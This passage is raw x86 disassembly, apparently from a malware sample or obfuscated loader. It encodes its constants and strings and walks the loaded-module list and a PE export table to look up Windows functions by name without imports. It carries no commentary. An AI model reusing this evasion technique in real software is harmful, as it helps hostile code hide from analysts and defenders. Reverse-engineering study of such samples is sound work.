  4267fc:	movzx  edi,WORD PTR [ebp+0x8]
  426800:	movzx  ebx,WORD PTR [ebp-0x8]
  426804:	add    edi,ebx
  426806:	mov    WORD PTR [ebp+0x8],di
  42680a:	mov    edi,DWORD PTR [ebp-0x20]
  42680d:	mov    bx,WORD PTR [ebp-0x4]
  426811:	xor    edi,esi
  426813:	add    edi,eax
  426815:	cmp    bx,di
  426818:	jb     0x426838
  42681a:	mov    edi,DWORD PTR [ebp-0x2c]
  42681d:	mov    bx,WORD PTR [ebp-0x4]
  426821:	xor    edi,esi
  426823:	add    edi,eax
  426825:	cmp    bx,di
  426828:	ja     0x426838
  42682a:	movzx  edi,WORD PTR [ebp-0x4]
  42682e:	movzx  ebx,WORD PTR [ebp-0x8]
  426832:	add    edi,ebx
  426834:	mov    WORD PTR [ebp-0x4],di
  426838:	mov    di,WORD PTR [ebp-0x4]
  42683c:	mov    bx,WORD PTR [ebp+0x8]
  426840:	cmp    bx,di
  426843:	jne    0x42693d
  426849:	mov    edi,DWORD PTR [ebp-0x1c]
  42684c:	mov    ebx,DWORD PTR [ebp-0x10]
  42684f:	xor    edi,ecx
  426851:	lea    edi,[edi+ebx*1+0x3272f8]
  426858:	mov    DWORD PTR [ebp-0x10],edi
  42685b:	mov    edi,DWORD PTR [ebp-0x1c]
  42685e:	mov    ebx,DWORD PTR [ebp-0x14]
  426861:	xor    edi,ecx
  426863:	lea    edi,[edi+ebx*1+0x3272f8]
  42686a:	mov    DWORD PTR [ebp-0x14],edi
  42686d:	mov    edi,DWORD PTR [ebp-0x24]
  426870:	mov    ebx,DWORD PTR [ebp-0x10]
  426873:	mov    di,WORD PTR [ebx+edi*2]
  426877:	mov    WORD PTR [ebp+0x8],di
  42687b:	mov    edi,DWORD PTR [ebp-0x28]
  42687e:	mov    ebx,DWORD PTR [ebp-0x14]
  426881:	mov    di,WORD PTR [ebx+edi*2]
  426885:	mov    WORD PTR [ebp-0x4],di
  426889:	mov    edi,DWORD PTR [ebp-0xc]
  42688c:	mov    bx,WORD PTR [ebp+0x8]
  426890:	xor    edi,esi
  426892:	add    edi,eax
  426894:	cmp    bx,di
  426897:	jne    0x4267ad
  42689d:	mov    eax,DWORD PTR [ebp-0x18]
  4268a0:	mov    esi,DWORD PTR [ebp-0xc]
  4268a3:	xor    eax,ecx
  4268a5:	add    eax,edx
  4268a7:	imul   eax,esi
  4268aa:	mov    DWORD PTR [ebp-0xc],eax
  4268ad:	jmp    0x4268c1
  4268af:	mov    eax,DWORD PTR [ebp-0xc]
  4268b2:	mov    esi,DWORD PTR [ebp-0x18]
  4268b5:	xor    eax,ecx
  4268b7:	lea    eax,[eax+esi*1+0x3272f8]
  4268be:	mov    DWORD PTR [ebp-0x18],eax
  4268c1:	mov    eax,DWORD PTR [ebp-0x24]
  4268c4:	sub    eax,edx
  4268c6:	xor    eax,ecx
  4268c8:	mov    DWORD PTR [ebp-0x30],eax
  4268cb:	mov    eax,DWORD PTR [ebp-0x28]
  4268ce:	sub    eax,edx
  4268d0:	xor    eax,ecx
  4268d2:	mov    DWORD PTR [ebp-0x34],eax
  4268d5:	mov    eax,DWORD PTR [ebp-0x34]
  4268d8:	mov    esi,DWORD PTR [ebp-0x1c]
  4268db:	xor    esi,ecx
  4268dd:	add    esi,edx
  4268df:	xor    eax,ecx
  4268e1:	add    eax,0x3272f8
  4268e6:	imul   esi,eax
  4268e9:	mov    eax,DWORD PTR [ebp-0x14]
  4268ec:	movzx  eax,WORD PTR [esi+eax*1]
  4268f0:	mov    esi,DWORD PTR [ebp-0x30]
  4268f3:	mov    edi,DWORD PTR [ebp-0x1c]
  4268f6:	xor    esi,ecx
  4268f8:	add    esi,edx
  4268fa:	xor    edi,ecx
  4268fc:	add    edi,edx
  4268fe:	imul   edi,esi
  426901:	mov    esi,DWORD PTR [ebp-0x10]
  426904:	movzx  esi,WORD PTR [edi+esi*1]
  426908:	sub    eax,edx
  42690a:	sub    esi,edx
  42690c:	xor    eax,ecx
  42690e:	xor    esi,ecx
  426910:	cmp    esi,eax
  426912:	jne    0x42693d
  426914:	mov    eax,DWORD PTR [ebp-0x30]
  426917:	mov    esi,DWORD PTR [ebp-0x1c]
  42691a:	xor    eax,ecx
  42691c:	add    eax,0x3272f8
  426921:	xor    esi,ecx
  426923:	add    esi,edx
  426925:	imul   esi,eax
  426928:	mov    eax,DWORD PTR [ebp-0x10]
  42692b:	movzx  eax,WORD PTR [esi+eax*1]
  42692f:	mov    esi,DWORD PTR [ebp-0xc]
  426932:	sub    eax,edx
  426934:	xor    eax,ecx
  426936:	cmp    eax,esi
  426938:	mov    eax,DWORD PTR [ebp-0xc]
  42693b:	je     0x426940
  42693d:	mov    eax,DWORD PTR [ebp-0x18]
  426940:	pop    edi
  426941:	xor    eax,ecx
  426943:	pop    esi
  426944:	add    eax,edx
  426946:	pop    ebx
  426947:	leave  
  426948:	ret    0x8
  42694b:	push   ebp
  42694c:	mov    ebp,esp
  42694e:	push   ecx
  42694f:	mov    cx,WORD PTR [eax]
  426952:	push   esi
  426953:	mov    esi,0x3b5e
  426958:	sub    cx,si
  42695b:	mov    esi,0x8a9c
  426960:	xor    cx,si
  426963:	mov    esi,0x4e3e
  426968:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42696f:	mov    edx,0xf89c85b9
  426974:	cmp    cx,si
  426977:	je     0x4269d6
  426979:	push   ebx
  42697a:	push   edi
  42697b:	movzx  ecx,cx
  42697e:	mov    edi,0xffcd8d08
  426983:	mov    esi,0x75108b1
  426988:	mov    ebx,0x4e62
  42698d:	cmp    cx,bx
  426990:	jne    0x426995
  426992:	mov    DWORD PTR [ebp-0x4],edx
  426995:	lea    edx,[edi+0x1]
  426998:	xor    edx,esi
  42699a:	mov    edi,edx
  42699c:	xor    edi,esi
  42699e:	mov    cx,WORD PTR [eax+edi*2+0x64e5f0]
  4269a6:	mov    ebx,0x3b5e
  4269ab:	sub    cx,bx
  4269ae:	mov    ebx,0x8a9c
  4269b3:	xor    cx,bx
  4269b6:	mov    ebx,0x4e3e
  4269bb:	cmp    cx,bx
  4269be:	jne    0x426988
  4269c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4269c3:	pop    edi
  4269c4:	pop    ebx
  4269c5:	cmp    ecx,0xf89c85b6
  4269cb:	je     0x4269d6
  4269cd:	xor    ecx,esi
  4269cf:	lea    eax,[eax+ecx*2+0x64e5f2]
  4269d6:	pop    esi
  4269d7:	leave  
  4269d8:	ret    
  4269d9:	push   ebp
  4269da:	mov    ebp,esp
  4269dc:	push   ecx
  4269dd:	push   esi
  4269de:	push   edi
  4269df:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  4269e6:	mov    esi,0xf89c85b9
  4269eb:	call   0x42694b
  4269f0:	mov    edi,eax
  4269f2:	mov    al,BYTE PTR [edi]
  4269f4:	sub    al,0x5
  4269f6:	xor    al,0x80
  4269f8:	cmp    al,0x7b
  4269fa:	je     0x426a5d
  4269fc:	mov    eax,edi
  4269fe:	mov    edx,0xffcd8d08
  426a03:	mov    ecx,0x75108b1
  426a08:	push   ebx
  426a09:	mov    ax,WORD PTR [eax]
  426a0c:	mov    ebx,0x3b5e
  426a11:	sub    ax,bx
  426a14:	mov    ebx,0x8a9c
  426a19:	xor    ax,bx
  426a1c:	mov    ebx,0x4e4c
  426a21:	cmp    ax,bx
  426a24:	jne    0x426a29
  426a26:	mov    DWORD PTR [ebp-0x4],esi
  426a29:	lea    esi,[edx+0x1]
  426a2c:	xor    esi,ecx
  426a2e:	mov    edx,esi
  426a30:	xor    edx,ecx
  426a32:	lea    eax,[edi+edx*2+0x64e5f0]
  426a39:	mov    bl,BYTE PTR [eax]
  426a3b:	sub    bl,0x5
  426a3e:	xor    bl,0x80
  426a41:	cmp    bl,0x7b
  426a44:	jne    0x426a09
  426a46:	mov    eax,DWORD PTR [ebp-0x4]
  426a49:	pop    ebx
  426a4a:	cmp    eax,0xf89c85b6
  426a4f:	je     0x426a5d
  426a51:	xor    eax,ecx
  426a53:	xor    ecx,ecx
  426a55:	mov    WORD PTR [edi+eax*2+0x64e5f0],cx
  426a5d:	mov    eax,edi
  426a5f:	pop    edi
  426a60:	pop    esi
  426a61:	leave  
  426a62:	ret    
  426a63:	push   ebp
  426a64:	mov    ebp,esp
  426a66:	push   ecx
  426a67:	push   esi
  426a68:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  426a6f:	mov    esi,0xf89c85b9
  426a74:	call   0x42694b
  426a79:	mov    cx,WORD PTR [eax]
  426a7c:	mov    edx,0x3b5e
  426a81:	sub    cx,dx
  426a84:	mov    edx,0x8a9c
  426a89:	xor    cx,dx
  426a8c:	mov    edx,0x4e3e
  426a91:	cmp    cx,dx
  426a94:	je     0x426aed
  426a96:	push   ebx
  426a97:	push   edi
  426a98:	movzx  ecx,cx
  426a9b:	mov    edx,0xffcd8d08
  426aa0:	mov    edi,0x75108b1
  426aa5:	mov    ebx,0x4e4c
  426aaa:	cmp    cx,bx
  426aad:	jne    0x426ab2
  426aaf:	mov    DWORD PTR [ebp-0x4],esi
  426ab2:	lea    esi,[edx+0x1]
  426ab5:	xor    esi,edi
  426ab7:	mov    edx,esi
  426ab9:	xor    edx,edi
  426abb:	mov    cx,WORD PTR [eax+edx*2+0x64e5f0]
  426ac3:	mov    ebx,0x3b5e
  426ac8:	sub    cx,bx
  426acb:	mov    ebx,0x8a9c
  426ad0:	xor    cx,bx
  426ad3:	mov    ebx,0x4e3e
  426ad8:	cmp    cx,bx
  426adb:	jne    0x426aa5
  426add:	cmp    DWORD PTR [ebp-0x4],0xf89c85b6
  426ae4:	pop    edi
  426ae5:	pop    ebx
  426ae6:	je     0x426aed
  426ae8:	xor    eax,eax
  426aea:	inc    eax
  426aeb:	jmp    0x426aef
  426aed:	xor    eax,eax
  426aef:	pop    esi
  426af0:	leave  
  426af1:	ret    
  426af2:	push   ebp
  426af3:	mov    ebp,esp
  426af5:	push   ecx
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	movzx  ecx,WORD PTR [eax]
  426afc:	push   esi
  426afd:	lea    eax,[ecx-0x3b5e]
  426b03:	mov    esi,0x8a9c
  426b08:	push   edi
  426b09:	xor    eax,esi
  426b0b:	mov    edi,0x4e3e
  426b10:	mov    DWORD PTR [ebp-0x4],edx
  426b13:	cmp    ax,di
  426b16:	je     0x426b43
  426b18:	mov    eax,DWORD PTR [ebp+0x8]
  426b1b:	sub    eax,edx
  426b1d:	mov    DWORD PTR [ebp+0x8],eax
  426b20:	jmp    0x426b25
  426b22:	mov    eax,DWORD PTR [ebp+0x8]
  426b25:	mov    WORD PTR [edx],cx
  426b28:	add    edx,0x2
  426b2b:	movzx  edi,WORD PTR [eax+edx*1]
  426b2f:	mov    ecx,edi
  426b31:	add    edi,0xffffc4a2
  426b37:	xor    edi,esi
  426b39:	mov    eax,0x4e3e
  426b3e:	cmp    di,ax
  426b41:	jne    0x426b22
  426b43:	xor    eax,eax
  426b45:	pop    edi
  426b46:	mov    WORD PTR [edx],ax
  426b49:	mov    eax,DWORD PTR [ebp-0x4]
  426b4c:	pop    esi
  426b4d:	leave  
  426b4e:	ret    0x4
  426b51:	push   ebp
  426b52:	mov    ebp,esp
  426b54:	sub    esp,0x18
  426b57:	mov    DWORD PTR [ebp-0x8],0xf89c85b9
  426b5e:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  426b65:	mov    ecx,DWORD PTR [ebp-0x8]
  426b68:	push   esi
  426b69:	mov    eax,0x75108b1
  426b6e:	xor    ecx,eax
  426b70:	mov    esi,0x3272f8
  426b75:	add    ecx,esi
  426b77:	mov    DWORD PTR [ebp-0x4],ecx
  426b7a:	mov    DWORD PTR [ebp-0xc],0xf89c85a1
  426b81:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  426b88:	push   edi
  426b89:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  426b90:	jmp    0x426c31
  426b95:	mov    ecx,DWORD PTR [ebp-0x4]
  426b98:	mov    edx,DWORD PTR [ebp+0x10]
  426b9b:	sub    edx,ecx
  426b9d:	mov    ecx,DWORD PTR [ebp-0xc]
  426ba0:	xor    ecx,eax
  426ba2:	add    ecx,esi
  426ba4:	cmp    edx,ecx
  426ba6:	jbe    0x426bc3
  426ba8:	mov    edx,DWORD PTR [ebp-0x4]
  426bab:	add    edx,DWORD PTR [ebp+0x8]
  426bae:	mov    ecx,DWORD PTR [ebp-0x4]
  426bb1:	add    ecx,DWORD PTR [ebp+0xc]
  426bb4:	mov    edi,DWORD PTR [ecx]
  426bb6:	mov    DWORD PTR [edx],edi
  426bb8:	mov    ecx,DWORD PTR [ecx+0x4]
  426bbb:	mov    DWORD PTR [edx+0x4],ecx
  426bbe:	mov    ecx,DWORD PTR [ebp-0xc]
  426bc1:	jmp    0x426c10
  426bc3:	mov    ecx,DWORD PTR [ebp-0x4]
  426bc6:	mov    edx,DWORD PTR [ebp+0x10]
  426bc9:	sub    edx,ecx
  426bcb:	mov    ecx,DWORD PTR [ebp-0x10]
  426bce:	xor    ecx,eax
  426bd0:	add    ecx,esi
  426bd2:	cmp    edx,ecx
  426bd4:	mov    ecx,DWORD PTR [ebp-0x4]
  426bd7:	jbe    0x426beb
  426bd9:	add    ecx,DWORD PTR [ebp+0x8]
  426bdc:	mov    edx,DWORD PTR [ebp-0x4]
  426bdf:	add    edx,DWORD PTR [ebp+0xc]
  426be2:	mov    edx,DWORD PTR [edx]
  426be4:	mov    DWORD PTR [ecx],edx
  426be6:	mov    ecx,DWORD PTR [ebp-0x10]
  426be9:	jmp    0x426c10
  426beb:	mov    edx,DWORD PTR [ebp+0x10]
  426bee:	sub    edx,ecx
  426bf0:	mov    ecx,DWORD PTR [ebp-0x14]
  426bf3:	xor    ecx,eax
  426bf5:	add    ecx,esi
  426bf7:	cmp    edx,ecx
  426bf9:	mov    ecx,DWORD PTR [ebp-0x4]
  426bfc:	jbe    0x426c21
  426bfe:	add    ecx,DWORD PTR [ebp+0x8]
  426c01:	mov    edx,DWORD PTR [ebp-0x4]
  426c04:	add    edx,DWORD PTR [ebp+0xc]
  426c07:	mov    dx,WORD PTR [edx]
  426c0a:	mov    WORD PTR [ecx],dx
  426c0d:	mov    ecx,DWORD PTR [ebp-0x14]
  426c10:	mov    edx,DWORD PTR [ebp-0x4]
  426c13:	xor    ecx,eax
  426c15:	lea    ecx,[ecx+edx*1+0x3272f8]
  426c1c:	mov    DWORD PTR [ebp-0x4],ecx
  426c1f:	jmp    0x426c31
  426c21:	add    ecx,DWORD PTR [ebp+0x8]
  426c24:	mov    edx,DWORD PTR [ebp-0x4]
  426c27:	add    edx,DWORD PTR [ebp+0xc]
  426c2a:	mov    dl,BYTE PTR [edx]
  426c2c:	mov    BYTE PTR [ecx],dl
  426c2e:	inc    DWORD PTR [ebp-0x4]
  426c31:	mov    ecx,DWORD PTR [ebp-0x18]
  426c34:	mov    edx,DWORD PTR [ebp+0x10]
  426c37:	xor    ecx,eax
  426c39:	add    ecx,esi
  426c3b:	imul   ecx,edx
  426c3e:	mov    edx,DWORD PTR [ebp-0x8]
  426c41:	mov    edi,DWORD PTR [ebp-0x4]
  426c44:	xor    edx,eax
  426c46:	lea    edx,[edx+edi*1+0x3272f8]
  426c4d:	cmp    edx,ecx
  426c4f:	jb     0x426b95
  426c55:	pop    edi
  426c56:	pop    esi
  426c57:	leave  
  426c58:	ret    0xc
  426c5b:	push   ebp
  426c5c:	mov    ebp,esp
  426c5e:	sub    esp,0xc
  426c61:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  426c68:	push   esi
  426c69:	mov    esi,eax
  426c6b:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  426c72:	mov    edx,DWORD PTR [ebp-0x4]
  426c75:	mov    eax,0x75108b1
  426c7a:	xor    edx,eax
  426c7c:	mov    ecx,0x3272f8
  426c81:	add    edx,ecx
  426c83:	cmp    esi,edx
  426c85:	je     0x426cc7
  426c87:	push   ebx
  426c88:	push   edi
  426c89:	mov    edx,DWORD PTR [ebp-0x8]
  426c8c:	mov    ebx,DWORD PTR [ebp+0x8]
  426c8f:	xor    edx,eax
  426c91:	mov    edi,0xffcd8d08
  426c96:	sub    edi,edx
  426c98:	add    esi,edi
  426c9a:	lea    edx,[esi-0x3272f8]
  426ca0:	xor    edx,eax
  426ca2:	mov    DWORD PTR [ebp-0xc],edx
  426ca5:	mov    edx,DWORD PTR [ebp-0x4]
  426ca8:	mov    edi,DWORD PTR [ebp-0xc]
  426cab:	xor    dl,0xb1
  426cae:	sub    dl,0x8
  426cb1:	xor    edi,eax
  426cb3:	mov    BYTE PTR [edi+ebx*1+0x3272f8],dl
  426cba:	mov    edx,DWORD PTR [ebp-0x4]
  426cbd:	xor    edx,eax
  426cbf:	add    edx,ecx
  426cc1:	cmp    esi,edx
  426cc3:	jne    0x426c89
  426cc5:	pop    edi
  426cc6:	pop    ebx
  426cc7:	pop    esi
  426cc8:	leave  
  426cc9:	ret    0x4
  426ccc:	push   ebp
  426ccd:	mov    ebp,esp
  426ccf:	sub    esp,0x21c
  426cd5:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  426cdc:	mov    DWORD PTR [ebp-0x14],0xf89c85b8
  426ce3:	mov    eax,DWORD PTR [ebp+0x10]
  426ce6:	mov    eax,DWORD PTR [ebp-0x4]
  426ce9:	mov    ecx,DWORD PTR [ebp+0x8]
  426cec:	push   esi
  426ced:	push   edi
  426cee:	mov    edi,0x75108b1
  426cf3:	xor    eax,edi
  426cf5:	mov    esi,0x3272f8
  426cfa:	add    eax,esi
  426cfc:	cmp    eax,ecx
  426cfe:	mov    eax,DWORD PTR [ebp-0x4]
  426d01:	jne    0x426d0c
  426d03:	xor    eax,edi
  426d05:	add    eax,esi
  426d07:	jmp    0x426db8
  426d0c:	mov    ecx,DWORD PTR [ebp+0xc]
  426d0f:	xor    eax,edi
  426d11:	add    eax,esi
  426d13:	cmp    eax,ecx
  426d15:	jne    0x426d1c
  426d17:	mov    eax,DWORD PTR [ebp-0x4]
  426d1a:	jmp    0x426d03
  426d1c:	lea    eax,[ebp-0x21c]
  426d22:	mov    DWORD PTR [ebp-0x8],eax
  426d25:	mov    eax,DWORD PTR [ebp+0xc]
  426d28:	mov    DWORD PTR [ebp-0x10],eax
  426d2b:	mov    eax,DWORD PTR [ebp-0x4]
  426d2e:	xor    eax,edi
  426d30:	add    eax,esi
  426d32:	mov    DWORD PTR [ebp+0x10],eax
  426d35:	mov    eax,DWORD PTR [ebp+0xc]
  426d38:	push   ebx
  426d39:	call   0x426a63
  426d3e:	mov    ebx,eax
  426d40:	mov    eax,DWORD PTR [ebp+0x8]
  426d43:	mov    eax,DWORD PTR [eax+0x14]
  426d46:	jmp    0x426da0
  426d48:	mov    eax,DWORD PTR [ebp+0xc]
  426d4b:	sub    eax,0x8
  426d4e:	mov    DWORD PTR [ebp-0xc],eax
  426d51:	mov    eax,DWORD PTR [ebp-0xc]
  426d54:	mov    eax,DWORD PTR [eax+0x28]
  426d57:	call   0x42694b
  426d5c:	mov    DWORD PTR [ebp+0x10],eax
  426d5f:	push   DWORD PTR [ebp+0x10]
  426d62:	mov    edx,DWORD PTR [ebp-0x8]
  426d65:	call   0x426af2
  426d6a:	mov    eax,DWORD PTR [ebp-0x4]
  426d6d:	xor    eax,edi
  426d6f:	add    eax,esi
  426d71:	cmp    eax,ebx
  426d73:	jne    0x426d7d
  426d75:	mov    eax,DWORD PTR [ebp-0x8]
  426d78:	call   0x4269d9
  426d7d:	mov    eax,DWORD PTR [ebp-0x14]
  426d80:	xor    eax,edi
  426d82:	add    eax,esi
  426d84:	push   eax
  426d85:	push   DWORD PTR [ebp-0x10]
  426d88:	mov    eax,DWORD PTR [ebp-0x8]
  426d8b:	call   0x426705
  426d90:	mov    ecx,DWORD PTR [ebp-0x4]
  426d93:	xor    ecx,edi
  426d95:	add    ecx,esi
  426d97:	cmp    eax,ecx
  426d99:	je     0x426dbe
  426d9b:	mov    eax,DWORD PTR [ebp+0xc]
  426d9e:	mov    eax,DWORD PTR [eax]
  426da0:	mov    DWORD PTR [ebp+0xc],eax
  426da3:	mov    eax,DWORD PTR [ebp+0x8]
  426da6:	mov    ecx,DWORD PTR [ebp+0xc]
  426da9:	add    eax,0x14
  426dac:	cmp    ecx,eax
  426dae:	jne    0x426d48
  426db0:	mov    eax,DWORD PTR [ebp-0x4]
  426db3:	xor    eax,edi
  426db5:	add    eax,esi
  426db7:	pop    ebx
  426db8:	pop    edi
  426db9:	pop    esi
  426dba:	leave  
  426dbb:	ret    0xc
  426dbe:	mov    eax,DWORD PTR [ebp-0xc]
  426dc1:	mov    eax,DWORD PTR [eax+0x18]
  426dc4:	jmp    0x426db7
  426dc6:	push   ebp
  426dc7:	mov    ebp,esp
  426dc9:	mov    eax,DWORD PTR [ebp+0xc]
  426dcc:	sub    esp,0x10
  426dcf:	cmp    DWORD PTR [ebp+0x8],0x0
  426dd3:	push   ebx
  426dd4:	push   esi
  426dd5:	push   edi
  426dd6:	je     0x426e8b
  426ddc:	test   eax,eax
  426dde:	je     0x426e8b
  426de4:	movzx  eax,WORD PTR [eax+0x20]
  426de8:	mov    ecx,eax
  426dea:	mov    DWORD PTR [ebp-0x10],eax
  426ded:	xor    edx,edx
  426def:	and    DWORD PTR [ebp-0x8],edx
  426df2:	mov    eax,0x8a9c
  426df7:	xor    ecx,eax
  426df9:	add    ecx,0x3b5e
  426dff:	mov    DWORD PTR [ebp-0xc],ecx
  426e02:	and    DWORD PTR [ebp-0x4],0x0
  426e06:	xor    ecx,ecx
  426e08:	push   0x7d
  426e0a:	pop    edi
  426e0b:	cmp    cx,WORD PTR [ebp-0xc]
  426e0f:	jae    0x426e75
  426e11:	lea    esi,[edx-0x3b5e]
  426e17:	xor    esi,eax
  426e19:	movzx  ecx,WORD PTR [ebp-0x4]
  426e1d:	mov    ebx,DWORD PTR [ebp+0xc]
  426e20:	lea    ecx,[ebx+ecx*4]
  426e23:	cmp    WORD PTR [ecx+0x2],si
  426e27:	jne    0x426e60
  426e29:	movzx  ecx,WORD PTR [ecx]
  426e2c:	mov    edi,0x4e3e
  426e31:	cmp    cx,di
  426e34:	jne    0x426e42
  426e36:	mov    ebx,DWORD PTR [ebp+0x8]
  426e39:	movzx  edi,dx
  426e3c:	cmp    BYTE PTR [edi+ebx*1],0x0
  426e40:	je     0x426e6f
  426e42:	mov    ebx,DWORD PTR [ebp+0x8]
  426e45:	movzx  edi,dx
  426e48:	movsx  di,BYTE PTR [edi+ebx*1]
  426e4d:	mov    ebx,0x3b5e
  426e52:	sub    di,bx
  426e55:	xor    di,ax
  426e58:	cmp    cx,di
  426e5b:	je     0x426e6f
  426e5d:	push   0x7b
  426e5f:	pop    edi
  426e60:	inc    DWORD PTR [ebp-0x4]
  426e63:	mov    cx,WORD PTR [ebp-0xc]
  426e67:	cmp    WORD PTR [ebp-0x4],cx
  426e6b:	jb     0x426e19
  426e6d:	jmp    0x426e75
  426e6f:	inc    DWORD PTR [ebp-0x8]
  426e72:	push   0x7c
  426e74:	pop    edi
  426e75:	mov    esi,DWORD PTR [ebp+0x8]
  426e78:	movzx  ecx,dx
  426e7b:	cmp    BYTE PTR [ecx+esi*1],0x0
  426e7f:	je     0x426e94
  426e81:	inc    edx
  426e82:	cmp    edi,0x7b
  426e85:	jne    0x426e02
  426e8b:	xor    eax,eax
  426e8d:	pop    edi
  426e8e:	pop    esi
  426e8f:	pop    ebx
  426e90:	leave  
  426e91:	ret    0x8
  426e94:	mov    ecx,DWORD PTR [ebp-0x8]
  426e97:	add    ecx,0xffffc4a2
  426e9d:	xor    cx,ax
  426ea0:	xor    eax,eax
  426ea2:	cmp    cx,WORD PTR [ebp-0x10]
  426ea6:	sete   al
  426ea9:	jmp    0x426e8d
  426eab:	push   ebp
  426eac:	mov    ebp,esp
  426eae:	sub    esp,0x50
  426eb1:	push   edi
  426eb2:	mov    edi,eax
  426eb4:	mov    eax,DWORD PTR [edi+0x1a8]
  426eba:	cmp    DWORD PTR [eax],0x0
  426ebd:	jne    0x426ec6
  426ebf:	xor    eax,eax
  426ec1:	jmp    0x426ff7
  426ec6:	push   DWORD PTR [ebp+0x8]
  426ec9:	push   0x2c
  426ecb:	pop    eax
  426ecc:	call   0x426c5b
  426ed1:	mov    edx,DWORD PTR [edi+0x1ac]
  426ed7:	lea    eax,[edi+0x22]
  426eda:	mov    DWORD PTR [ebp-0x4c],eax
  426edd:	lea    eax,[edi+0x44]
  426ee0:	mov    DWORD PTR [ebp-0x48],eax
  426ee3:	lea    eax,[edi+0x66]
  426ee6:	mov    DWORD PTR [ebp-0x44],eax
  426ee9:	lea    eax,[edi+0x88]
  426eef:	mov    DWORD PTR [ebp-0x40],eax
  426ef2:	lea    eax,[edi+0xaa]
  426ef8:	mov    DWORD PTR [ebp-0x3c],eax
  426efb:	lea    eax,[edi+0xcc]
  426f01:	mov    DWORD PTR [ebp-0x38],eax
  426f04:	lea    eax,[edi+0xee]
  426f0a:	mov    DWORD PTR [ebp-0x34],eax
  426f0d:	lea    eax,[edi+0x110]
  426f13:	mov    DWORD PTR [ebp-0x30],eax
  426f16:	lea    eax,[edi+0x132]
  426f1c:	mov    DWORD PTR [ebp-0x2c],eax
  426f1f:	lea    eax,[edi+0x154]
  426f25:	push   edi
  426f26:	mov    DWORD PTR [ebp-0x50],edi
  426f29:	mov    DWORD PTR [ebp-0x28],eax
  426f2c:	call   0x42702b
  426f31:	push   eax
  426f32:	mov    eax,DWORD PTR [edi+0x1a8]
  426f38:	push   DWORD PTR [eax]
  426f3a:	call   0x426ccc
  426f3f:	mov    DWORD PTR [ebp-0x10],eax
  426f42:	test   eax,eax
  426f44:	je     0x426ff7
  426f4a:	mov    ecx,DWORD PTR [eax+0x3c]
  426f4d:	push   ebx
  426f4e:	push   esi
  426f4f:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  426f53:	add    esi,eax
  426f55:	mov    edi,DWORD PTR [esi+0x24]
  426f58:	mov    ecx,DWORD PTR [esi+0x1c]
  426f5b:	mov    edx,DWORD PTR [esi+0x20]
  426f5e:	mov    ebx,DWORD PTR [esi+0x18]
  426f61:	add    edi,eax
  426f63:	mov    DWORD PTR [ebp-0x20],edi
  426f66:	mov    edi,DWORD PTR [esi+0x14]
  426f69:	add    ecx,eax
  426f6b:	add    edx,eax
  426f6d:	mov    DWORD PTR [ebp-0xc],ecx
  426f70:	mov    DWORD PTR [ebp-0x1c],edx
  426f73:	mov    DWORD PTR [ebp-0x8],edi
  426f76:	cmp    edi,ebx
  426f78:	ja     0x426f7d
  426f7a:	mov    DWORD PTR [ebp-0x8],ebx
  426f7d:	xor    ebx,ebx
  426f7f:	mov    DWORD PTR [ebp-0x18],ebx
  426f82:	cmp    DWORD PTR [ebp-0x8],ebx
  426f85:	jbe    0x426ff5
  426f87:	jmp    0x426f8c
  426f89:	mov    edx,DWORD PTR [ebp-0x1c]
  426f8c:	mov    edi,DWORD PTR [ebp-0x20]
  426f8f:	movzx  edi,WORD PTR [edi+ebx*2]
  426f93:	cmp    ebx,DWORD PTR [esi+0x18]
  426f96:	jae    0x426ff5
  426f98:	cmp    edi,DWORD PTR [esi+0x14]
  426f9b:	jae    0x426ff5
  426f9d:	mov    ebx,DWORD PTR [edx+ebx*4]
  426fa0:	mov    edx,DWORD PTR [ebp+0x8]
  426fa3:	mov    edi,DWORD PTR [ecx+edi*4]
  426fa6:	mov    DWORD PTR [ebp-0x4],edx
  426fa9:	lea    edx,[ebp-0x50]
  426fac:	add    ebx,eax
  426fae:	add    edi,eax
  426fb0:	sub    edx,DWORD PTR [ebp+0x8]
  426fb3:	mov    DWORD PTR [ebp-0x14],0xb
  426fba:	mov    DWORD PTR [ebp-0x24],edx
  426fbd:	mov    edx,DWORD PTR [ebp-0x4]
  426fc0:	cmp    DWORD PTR [edx],0x0
  426fc3:	jne    0x426fe0
  426fc5:	mov    eax,DWORD PTR [ebp-0x24]
  426fc8:	push   DWORD PTR [eax+edx*1]
  426fcb:	push   ebx
  426fcc:	call   0x426dc6
  426fd1:	mov    ecx,DWORD PTR [ebp-0xc]
  426fd4:	test   eax,eax
  426fd6:	je     0x426fdd
  426fd8:	mov    eax,DWORD PTR [ebp-0x4]
  426fdb:	mov    DWORD PTR [eax],edi
  426fdd:	mov    eax,DWORD PTR [ebp-0x10]
  426fe0:	add    DWORD PTR [ebp-0x4],0x4
  426fe4:	dec    DWORD PTR [ebp-0x14]
  426fe7:	jne    0x426fbd
  426fe9:	mov    ebx,DWORD PTR [ebp-0x18]
  426fec:	inc    ebx
  426fed:	mov    DWORD PTR [ebp-0x18],ebx
  426ff0:	cmp    ebx,DWORD PTR [ebp-0x8]
  426ff3:	jb     0x426f89
  426ff5:	pop    esi
  426ff6:	pop    ebx
  426ff7:	pop    edi
  426ff8:	leave  
  426ff9:	ret    0x4
  426ffc:	push   ebp
  426ffd:	mov    ebp,esp
  426fff:	mov    eax,DWORD PTR [ebp+0x8]
  427002:	push   esi
  427003:	push   DWORD PTR [eax+0x1e0]
  427009:	lea    esi,[eax+0x198]
  42700f:	mov    eax,DWORD PTR [ebp+0x8]
  427012:	call   0x426eab
  427017:	mov    ecx,DWORD PTR [esi]
  427019:	mov    DWORD PTR [ecx],eax
  42701b:	mov    eax,DWORD PTR [esi]
  42701d:	xor    ecx,ecx
  42701f:	cmp    DWORD PTR [eax],ecx
  427021:	pop    esi
  427022:	setne  cl
  427025:	mov    eax,ecx
  427027:	pop    ebp
  427028:	ret    0x4
  42702b:	mov    ecx,DWORD PTR [edi+0x188]
  427031:	push   ebx
  427032:	jmp    0x427047
  427034:	xor    eax,0x8a9c
